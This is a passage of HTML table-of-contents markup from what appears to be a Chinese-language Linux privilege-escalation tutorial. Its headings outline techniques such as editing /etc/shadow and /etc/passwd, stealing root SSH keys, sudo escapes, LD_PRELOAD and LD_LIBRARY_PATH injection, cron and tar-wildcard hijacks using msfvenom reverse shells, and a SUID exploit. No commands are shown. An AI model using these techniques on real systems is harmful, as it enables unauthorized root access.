          1.检查权限&#x2F;etc&#x2F;shadow 文件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%A4%8D%E5%88%B6%E4%BF%9D%E5%AD%98-etc-shadow-%E7%9A%84%E5%86%85%E5%AE%B9%EF%BC%8C%E4%BB%A5%E4%BE%BF%E6%88%91%E4%BB%AC%E4%BB%A5%E5%90%8E%E5%8F%AF%E4%BB%A5%E6%81%A2%E5%A4%8D"><span class="toc-number">6.3.2.2.</span> <span class="toc-text">
          2.复制保存&#x2F;etc&#x2F;shadow 的内容，以便我们以后可以恢复</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E7%94%9F%E6%88%90-%E6%96%B0%E7%9A%84-SHA-512-%E5%AF%86%E7%A0%81-%E5%93%88%E5%B8%8C%EF%BC%9A"><span class="toc-number">6.3.2.3.</span> <span class="toc-text">
          3.生成 新的 SHA-512 密码 哈希：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E7%BC%96%E8%BE%91-etc-shadow%EF%BC%8C%E5%B9%B6%E5%B0%86%E6%A0%B9%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81%E5%93%88%E5%B8%8C%E6%9B%BF%E6%8D%A2%E4%B8%BA%E6%88%91%E4%BB%AC%E7%94%9F%E6%88%90%E7%9A%84%E5%AF%86%E7%A0%81%E3%80%82"><span class="toc-number">6.3.2.4.</span> <span class="toc-text">
          4.编辑&#x2F;etc&#x2F;shadow，并将根用户的密码哈希替换为我们生成的密码。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E4%BD%BF%E7%94%A8su-%E5%91%BD%E4%BB%A4%E5%88%87%E6%8D%A2%E5%88%B0%E6%A0%B9%E7%94%A8%E6%88%B7"><span class="toc-number">6.3.2.5.</span> <span class="toc-text">
          5.使用su 命令切换到根用户</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%92%88%E5%AF%B9-etc-passwd%E6%96%87%E4%BB%B6"><span class="toc-number">6.4.</span> <span class="toc-text">
          针对&#x2F;etc&#x2F;passwd文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-5"><span class="toc-number">6.4.1.</span> <span class="toc-text">
          前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D-3"><span class="toc-number">6.4.2.</span> <span class="toc-text">
          实操</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5-etc-passwd%E6%96%87%E4%BB%B6%E7%9A%84%E6%9D%83%E9%99%90%EF%BC%9A"><span class="toc-number">6.4.2.1.</span> <span class="toc-text">
          检查&#x2F;etc&#x2F;passwd文件的权限：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E4%BD%BF%E7%94%A8openssl%E7%94%9F%E6%88%90%E5%AF%86%E7%A0%81%E5%93%88%E5%B8%8C%EF%BC%9A"><span class="toc-number">6.4.2.2.</span> <span class="toc-text">
          2.使用openssl生成密码哈希：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E7%BC%96%E8%BE%91-etc-passwd%E6%96%87%E4%BB%B6"><span class="toc-number">6.4.2.3.</span> <span class="toc-text">
          3.编辑 &#x2F;etc&#x2F;passwd文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E4%BD%BF%E7%94%A8su%E5%91%BD%E4%BB%A4%E5%88%87%E6%8D%A2%E5%88%B0%E6%A0%B9%E7%94%A8%E6%88%B7"><span class="toc-number">6.4.2.4.</span> <span class="toc-text">
          4.使用su命令切换到根用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#or"><span class="toc-number">6.4.2.5.</span> <span class="toc-text">
          or</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%88%9B%E5%BB%BA%E5%A4%87%E7%94%A8%E6%A0%B9%E7%94%A8%E6%88%B7"><span class="toc-number">6.4.2.6.</span> <span class="toc-text">
          1.创建备用根用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E4%BD%BF%E7%94%A8su%E5%91%BD%E4%BB%A4%E5%88%87%E6%8D%A2%E5%88%B0%E6%96%B0%E6%A0%B9%E7%94%A8%E6%88%B7%EF%BC%9A"><span class="toc-number">6.4.2.7.</span> <span class="toc-text">
          2.使用su命令切换到新根用户：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%87%E4%BB%BD"><span class="toc-number">6.5.</span> <span class="toc-text">
          备份</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-6"><span class="toc-number">6.5.1.</span> <span class="toc-text">
          前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D-4"><span class="toc-number">6.5.2.</span> <span class="toc-text">
          实操</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9C%A8%E5%B8%B8%E8%A7%81%E4%BD%8D%E7%BD%AE%E6%9F%A5%E6%89%BE%E6%96%87%E4%BB%B6%EF%BC%8C%E5%B0%A4%E5%85%B6%E6%98%AF%E4%B8%80%E4%BA%9B%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6"><span class="toc-number">6.5.3.</span> <span class="toc-text">
          1.在常见位置查找文件，尤其是一些隐藏文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-root%E7%9B%AE%E5%BD%95%E4%B8%8B%E5%AD%98%E5%9C%A8%E9%9A%90%E8%97%8F%E7%9A%84-ssh%E7%9B%AE%E5%BD%95%EF%BC%9A"><span class="toc-number">6.5.4.</span> <span class="toc-text">
          2.root目录下存在隐藏的.ssh目录：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%BF%BB%E7%9C%8B-ssh%E7%9B%AE%E5%BD%95"><span class="toc-number">6.5.5.</span> <span class="toc-text">
          3.翻看.ssh目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%BF%9B%E4%B8%80%E6%AD%A5%E6%A3%80%E6%9F%A5root-key%E6%96%87%E4%BB%B6"><span class="toc-number">6.5.6.</span> <span class="toc-text">
          4.进一步检查root_key文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F"><span class="toc-number">6.5.7.</span> <span class="toc-text">
          注意</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%B0%86%E5%AF%86%E9%92%A5%E5%A4%8D%E5%88%B6%E5%88%B0%E6%9C%AC%E5%9C%B0%E6%9C%BA%E5%99%A8%EF%BC%8C%E5%B9%B6%E7%BB%99%E4%BA%88%E5%85%B6%E6%AD%A3%E7%A1%AE%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-number">6.5.8.</span> <span class="toc-text">
          5.将密钥复制到本地机器，并给予其正确的权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E4%BD%BF%E7%94%A8%E5%B0%86SSH%E7%9A%84%E5%AF%86%E9%92%A5%E7%99%BB%E5%BD%95root%E5%B8%90%E6%88%B7%EF%BC%9A"><span class="toc-number">6.5.9.</span> <span class="toc-text">
          6.使用将SSH的密钥登录root帐户：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-SUDO"><span class="toc-number">7.</span> <span class="toc-text">
          0x07 SUDO</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-7"><span class="toc-number">7.1.</span> <span class="toc-text">
          前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E7%9A%84%E5%91%BD%E4%BB%A4-1"><span class="toc-number">7.2.</span> <span class="toc-text">
          相关的命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E5%A3%B3%E9%80%83%E7%94%9F%E5%BA%8F%E5%88%97"><span class="toc-number">7.3.</span> <span class="toc-text">
          外壳逃生序列</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4"><span class="toc-number">7.4.</span> <span class="toc-text">
          步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%88%97%E5%87%BA%E5%85%81%E8%AE%B8%E7%94%A8%E6%88%B7%E8%BF%90%E8%A1%8C%E7%9A%84%E7%A8%8B%E5%BA%8F"><span class="toc-number">7.4.1.</span> <span class="toc-text">
          1.列出允许用户运行的程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AF%B9%E6%AF%8F%E4%B8%AA%E7%A8%8B%E5%BA%8F%E8%BF%9B%E8%A1%8C%E6%9F%A5%E8%A1%A8%EF%BC%8C%E8%A6%81%E7%BB%86%E5%BF%83"><span class="toc-number">7.4.2.</span> <span class="toc-text">
          2.对每个程序进行查表，要细心</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%A6%82%E6%9E%9C%E5%AD%98%E5%9C%A8%E9%80%83%E7%94%9F%E5%BA%8F%E5%88%97%EF%BC%8C%E5%88%99%E9%80%9A%E8%BF%87sudo-%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F%E5%B9%B6%E6%89%A7%E8%A1%8C%E5%BA%8F%E5%88%97%E4%BB%A5%E7%94%9F%E6%88%90%E6%A0%B9%E5%A3%B3%E3%80%82"><span class="toc-number">7.4.3.</span> <span class="toc-text">
          3.如果存在逃生序列，则通过sudo 运行程序并执行序列以生成根壳。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BB%A5%E7%94%A8%E9%A2%84%E6%9C%9F%E5%8A%9F%E8%83%BD"><span class="toc-number">7.5.</span> <span class="toc-text">
          滥用预期功能</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D-5"><span class="toc-number">7.5.1.</span> <span class="toc-text">
          实操</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%85%81%E8%AE%B8%E7%94%A8%E6%88%B7%E9%80%9A%E8%BF%87Sudo%E8%BF%90%E8%A1%8C%E7%9A%84%E7%A8%8B%E5%BA%8F%EF%BC%9A"><span class="toc-number">7.5.1.1.</span> <span class="toc-text">
          1.允许用户通过Sudo运行的程序：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-apache2"><span class="toc-number">7.5.1.2.</span> <span class="toc-text">
          2.apache2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E4%BD%BF%E7%94%A8sudo%E8%BF%90%E8%A1%8Capache2%EF%BC%8C%E5%B9%B6%E6%8F%90%E4%BE%9B-etc-shadow%E6%96%87%E4%BB%B6%E4%BD%9C%E4%B8%BA%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">7.5.1.3.</span> <span class="toc-text">
          3.使用sudo运行apache2，并提供&#x2F;etc&#x2F;shadow文件作为配置文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E4%BB%8E%E6%96%87%E4%BB%B6%E4%B8%AD%E6%8F%90%E5%8F%96%E6%A0%B9%E7%94%A8%E6%88%B7%E7%9A%84%E5%93%88%E5%B8%8C%E3%80%82"><span class="toc-number">7.5.1.4.</span> <span class="toc-text">
          4.从文件中提取根用户的哈希。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E5%B0%86%E5%AF%86%E7%A0%81%E5%93%88%E5%B8%8C%E4%BF%9D%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%AD%EF%BC%9A"><span class="toc-number">7.5.1.5.</span> <span class="toc-text">
          5.将密码哈希保存在文件中：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E4%BD%BF%E7%94%A8%E5%BC%80%E8%86%9B%E6%89%8B%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81%E5%93%88%E5%B8%8C%EF%BC%9A"><span class="toc-number">7.5.1.6.</span> <span class="toc-text">
          6.使用开膛手破解密码哈希：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E4%BD%BF%E7%94%A8su-%E5%91%BD%E4%BB%A4%E5%88%87%E6%8D%A2%E5%88%B0root%E7%94%A8%E6%88%B7"><span class="toc-number">7.5.1.7.</span> <span class="toc-text">
          7.使用su 命令切换到root用户</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">7.5.2.</span> <span class="toc-text">
          环境变量</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LD-PRELOAD"><span class="toc-number">7.5.2.1.</span> <span class="toc-text">
          LD_PRELOAD</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-8"><span class="toc-number">7.5.2.1.1.</span> <span class="toc-text">
          前言</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B1%80%E9%99%90%E6%80%A7"><span class="toc-number">7.5.2.1.2.</span> <span class="toc-text">
          局限性</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D-6"><span class="toc-number">7.5.2.1.3.</span> <span class="toc-text">
          实操</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%88%97%E5%87%BA%E5%85%81%E8%AE%B8%E7%94%A8%E6%88%B7%E8%BF%90%E8%A1%8C%E7%9A%84%E7%A8%8B%E5%BA%8F-1"><span class="toc-number">7.5.2.1.4.</span> <span class="toc-text">
          1.列出允许用户运行的程序</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%88%9B%E5%BB%BA%E5%85%B7%E6%9C%89%E4%BB%A5%E4%B8%8B%E5%86%85%E5%AE%B9%E7%9A%84%E6%96%87%E4%BB%B6-preload-c-%EF%BC%9A"><span class="toc-number">7.5.2.1.5.</span> <span class="toc-text">
          2.创建具有以下内容的文件(preload.c)：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E7%BC%96%E8%AF%91preload-c%E5%88%B0preload-so%EF%BC%9A"><span class="toc-number">7.5.2.1.6.</span> <span class="toc-text">
          3.编译preload.c到preload.so：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E4%BD%BF%E7%94%A8sudo%E8%BF%90%E8%A1%8C%E4%BB%BB%E4%BD%95%E5%85%81%E8%AE%B8%E7%9A%84%E7%A8%8B%E5%BA%8F%EF%BC%8C%E5%90%8C%E6%97%B6%E5%B0%86LD-PRELOAD%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E8%AE%BE%E7%BD%AE%E4%B8%BApreload-so%E6%96%87%E4%BB%B6%E7%9A%84%E5%AE%8C%E6%95%B4%E8%B7%AF%E5%BE%84%EF%BC%9A"><span class="toc-number">7.5.2.1.7.</span> <span class="toc-text">
          4.使用sudo运行任何允许的程序，同时将LD_PRELOAD环境变量设置为preload.so文件的完整路径：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LD-LIBRARY-PATH"><span class="toc-number">7.5.2.2.</span> <span class="toc-text">
          LD_LIBRARY_PATH</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-9"><span class="toc-number">7.5.2.3.</span> <span class="toc-text">
          前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D-7"><span class="toc-number">7.5.2.4.</span> <span class="toc-text">
          实操</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E8%BF%90%E8%A1%8Cldd%E5%AF%B9apache2%E7%A8%8B%E5%BA%8F%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-number">7.5.2.4.1.</span> <span class="toc-text">
          1.运行ldd对apache2程序文件：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%88%9B%E5%BB%BA%E5%85%B7%E6%9C%89%E4%BB%A5%E4%B8%8B%E5%86%85%E5%AE%B9%E7%9A%84%E6%96%87%E4%BB%B6-library-path-c-%EF%BC%9A"><span class="toc-number">7.5.2.4.2.</span> <span class="toc-text">
          2.创建具有以下内容的文件(library_path.c)：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E5%B0%86library-path-c-%E7%BC%96%E8%AF%91%E6%88%90libcrypt-so-1"><span class="toc-number">7.5.2.4.3.</span> <span class="toc-text">
          3.将library_path.c 编译成libcrypt.so.1:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E4%BD%BF%E7%94%A8-sudo%E8%BF%90%E8%A1%8C-apache2%EF%BC%8C%E5%90%8C%E6%97%B6%E5%B0%86LD-LIBRARY-PATH%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E8%AE%BE%E7%BD%AE%E4%B8%BA%E5%BD%93%E5%89%8D%E8%B7%AF%E5%BE%84%EF%BC%88%E6%88%91%E4%BB%AC%E6%B1%87%E7%BC%96library-path-c%EF%BC%89%EF%BC%9A"><span class="toc-number">7.5.2.4.4.</span> <span class="toc-text">
          4.使用 sudo运行 apache2，同时将LD_LIBRARY_PATH环境变量设置为当前路径（我们汇编library_path.c）：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-Cron-jobs"><span class="toc-number">8.</span> <span class="toc-text">
          0x08 Cron jobs</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-10"><span class="toc-number">8.1.</span> <span class="toc-text">
          前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cron-tables"><span class="toc-number">8.2.</span> <span class="toc-text">
          Cron tables</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90-1"><span class="toc-number">8.3.</span> <span class="toc-text">
          文件权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D-8"><span class="toc-number">8.4.</span> <span class="toc-text">
          实操</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9F%A5%E7%9C%8Bsystem-wide-crontab%E7%9A%84%E5%86%85%E5%AE%B9%EF%BC%9A"><span class="toc-number">8.4.1.</span> <span class="toc-text">
          1.查看system-wide crontab的内容：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%9C%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%9F%A5%E6%89%BEoverwrite-sh-%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-number">8.4.2.</span> <span class="toc-text">
          2.在服务器上查找overwrite.sh 文件：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%A3%80%E6%9F%A5%E6%96%87%E4%BB%B6%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-number">8.4.3.</span> <span class="toc-text">
          3.检查文件的权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%B0%86-overwrite-sh%E6%96%87%E4%BB%B6%E7%9A%84%E5%86%85%E5%AE%B9%E6%9B%BF%E6%8D%A2%E4%B8%BA%EF%BC%9A"><span class="toc-number">8.4.4.</span> <span class="toc-text">
          4.将 overwrite.sh文件的内容替换为：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-kali%E4%B8%8A%E8%BF%90%E8%A1%8Cnc"><span class="toc-number">8.4.5.</span> <span class="toc-text">
          5.kali上运行nc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%AF%E5%BE%84%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">8.5.</span> <span class="toc-text">
          路径环境变量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D-9"><span class="toc-number">8.6.</span> <span class="toc-text">
          实操</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9F%A5%E7%9C%8Bsystem-wide-crontab%E7%9A%84%E5%86%85%E5%AE%B9%EF%BC%9A-1"><span class="toc-number">8.6.1.</span> <span class="toc-text">
          1.查看system-wide crontab的内容：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%9C%A8-home-user-%E4%B8%AD%E5%88%9B%E5%BB%BA%E6%96%87%E4%BB%B6-overwrite-sh%EF%BC%8C%E5%86%85%E5%AE%B9%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-number">8.6.2.</span> <span class="toc-text">
          2.在&#x2F;home&#x2F;user 中创建文件 overwrite.sh，内容如下：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8A%A0%E6%9D%83"><span class="toc-number">8.6.3.</span> <span class="toc-text">
          3.加权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%AD%89%E5%BE%85cronjob%E8%BF%90%E8%A1%8C%EF%BC%88%E6%AD%A4%E4%BD%9C%E4%B8%9A%E5%B0%A4%E5%85%B6%E6%AF%8F%E5%88%86%E9%92%9F%E8%BF%90%E8%A1%8C%E4%B8%80%E6%AC%A1%EF%BC%89%E3%80%82"><span class="toc-number">8.6.4.</span> <span class="toc-text">
          4.等待cronjob运行（此作业尤其每分钟运行一次）。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%88%9B%E5%BB%BA-tmp-rootbash%E6%96%87%E4%BB%B6"><span class="toc-number">8.6.5.</span> <span class="toc-text">
          5.创建&#x2F;tmp&#x2F;rootbash文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="toc-number">8.7.</span> <span class="toc-text">
          通配符</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-11"><span class="toc-number">8.7.1.</span> <span class="toc-text">
          前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6-amp-%E6%96%87%E4%BB%B6%E5%90%8D"><span class="toc-number">8.7.2.</span> <span class="toc-text">
          通配符 &amp; 文件名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D-10"><span class="toc-number">8.7.3.</span> <span class="toc-text">
          实操</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%9F%A5%E7%9C%8Bsystem-wide-crontab%E5%86%85%E5%AE%B9"><span class="toc-number">8.7.3.1.</span> <span class="toc-text">
          1.查看system-wide crontab内容:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E7%9A%84%E5%86%85%E5%AE%B9%EF%BC%9A"><span class="toc-number">8.7.3.2.</span> <span class="toc-text">
          2.查看文件的内容：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%9F%A5%E9%98%85%E5%8F%82%E8%80%83"><span class="toc-number">8.7.3.3.</span> <span class="toc-text">
          3.查阅参考</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E4%BD%BF%E7%94%A8msfvenom%E5%88%9B%E5%BB%BA%E5%8F%8D%E5%90%91%E5%A3%B3ELF%E6%9C%89%E6%95%88%E8%BD%BD%E8%8D%B7%EF%BC%9A"><span class="toc-number">8.7.3.4.</span> <span class="toc-text">
          4.使用msfvenom创建反向壳ELF有效载荷：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E6%90%9E%E6%96%87%E4%BB%B6%E5%88%B0tar%E6%89%80%E5%9C%A8%E8%BF%90%E8%A1%8C%E7%9B%AE%E5%BD%95%EF%BC%8C%E5%B9%B6%E5%8A%A0%E6%9D%83%EF%BC%9A"><span class="toc-number">8.7.3.5.</span> <span class="toc-text">
          5.搞文件到tar所在运行目录，并加权：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E5%9C%A8-home-user%E7%9B%AE%E5%BD%95%E4%B8%AD%E5%88%9B%E5%BB%BA%E4%B8%A4%E4%B8%AA%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-number">8.7.3.6.</span> <span class="toc-text">
          6.在&#x2F;home&#x2F;user目录中创建两个文件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-kali%E8%BF%90%E8%A1%8Cnc%E7%AD%89%E5%BE%85cron-job"><span class="toc-number">8.7.3.7.</span> <span class="toc-text">
          7.kali运行nc等待cron job</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x09-SUID-SGID%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6"><span class="toc-number">9.</span> <span class="toc-text">
          0x09 SUID &#x2F; SGID可执行文件</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-12"><span class="toc-number">9.1.</span> <span class="toc-text">
          前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUID-SGID%E6%96%87%E4%BB%B6"><span class="toc-number">9.2.</span> <span class="toc-text">
          SUID &#x2F; SGID文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E5%A3%B3%E9%80%83%E7%94%9F%E5%BA%8F%E5%88%97-1"><span class="toc-number">9.3.</span> <span class="toc-text">
          外壳逃生序列</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="toc-number">9.4.</span> <span class="toc-text">
          漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D-11"><span class="toc-number">9.5.</span> <span class="toc-text">
          实操</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9C%A8%E7%9B%AE%E6%A0%87%E4%B8%8A%E6%9F%A5%E6%89%BESUID-SGID-%E6%96%87%E4%BB%B6-%EF%BC%9A"><span class="toc-number">9.5.1.</span> <span class="toc-text">
          1.在目标上查找SUID&#x2F;SGID 文件 ：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%89%88%E6%9C%AC%E7%A1%AE%E8%AE%A4%EF%BC%9A"><span class="toc-number">9.5.2.</span> <span class="toc-text">
          2.版本确认：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%AF%BB%E6%89%BE"><span class="toc-number">9.5.3.</span> <span class="toc-text">
          3.漏洞寻找</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-CVE-2016-1531"><span class="toc-number">9.5.4.</span> <span class="toc-text">
          4.漏洞利用(CVE-2016-1531)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%8A%A0%E6%9D%83"><span class="toc-number">9.5.5.</span> <span class="toc-text">
          5.加权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%89%A7%E8%A1%8C%E8%84%9A%E6%9C%AC%E4%BB%A5%E8%8E%B7%E5%BE%97%E6%A0%B9%E5%A3%B3%EF%BC%9A"><span class="toc-number">9.5.6.</span> <span class="toc-text">
          6.执行脚本以获得根壳：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B1%E4%BA%AB%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">9.6.</span> <span class="toc-text">
          共享对象注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-13"><span class="toc-number">9.6.1.</span> <span class="toc-text">
          前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D-12"><span class="toc-number">9.6.2.</span> <span class="toc-text">
          实操</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%9C%A8%E7%9B%AE%E6%A0%87%E4%B8%8A%E6%9F%A5%E6%89%BESUID-SGID%E6%96%87%E4%BB%B6-%EF%BC%9A"><span class="toc-number">9.6.2.1.</span> <span class="toc-text">
          1.在目标上查找SUID&#x2F;SGID文件 ：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%9C%A8SUID%E6%96%87%E4%BB%B6%E4%B8%8A%E8%BF%90%E8%A1%8C%E5%88%86%E5%B1%82%EF%BC%9A"><span class="toc-number">9.6.2.2.</span> <span class="toc-text">
          2.在SUID文件上运行分层：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%88%9B%E5%BB%BA-home-user-config%E7%9B%AE%E5%BD%95"><span class="toc-number">9.6.2.3.</span> <span class="toc-text">
          3.创建 &#x2F;home&#x2F;user&#x2F;.config目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%88%9B%E5%BB%BAlibcalc-c%E5%85%B7%E6%9C%89-%E4%BB%A5%E4%B8%8B-%E5%86%85%E5%AE%B9%EF%BC%9A"><span class="toc-number">9.6.2.4.</span> <span class="toc-text">
